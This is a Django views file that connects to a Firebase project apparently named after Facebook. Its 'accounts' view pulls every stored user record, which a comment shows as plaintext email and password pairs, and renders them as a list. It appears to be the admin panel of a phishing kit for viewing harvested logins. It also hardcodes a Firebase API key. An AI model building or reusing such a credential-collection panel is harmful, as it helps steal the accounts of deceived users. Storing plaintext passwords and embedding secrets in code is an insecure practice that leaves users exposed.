from django.shortcuts import render
from pyrebase import pyrebase

config = {
  "apiKey": "AIzaSyAxTK3AVErxrgX7uzYzC3-cpgNes1qrLK8",
  "authDomain": "facebook-b-429a8.firebaseapp.com",
  "databaseURL": "https://facebook-b-429a8.firebaseio.com",
  "storageBucket": "facebook-b-429a8.appspot.com"
}

firebase = pyrebase.initialize_app(config)

# Create your views here.
def home(request):
    key = request.GET.get("k",False)
    context={
        "key": key,
    }
    return render(request, "home/index.html", context)

def accounts(request):
    db = firebase.database()
    userObj=db.child("users").get()
    key = request.GET.get("k",False)
    users = []
    i=0
    for user in userObj.each():
        u=user.val()
        i+=1
        numList={'num':i}
        numList.update(u)
        users.append(numList) #{"Email":"email, "Pass":"pass"}

    context={
            "key": key,
            "users": users,
            "test":users,
    }
    return render(request, "home/accounts.html", context)

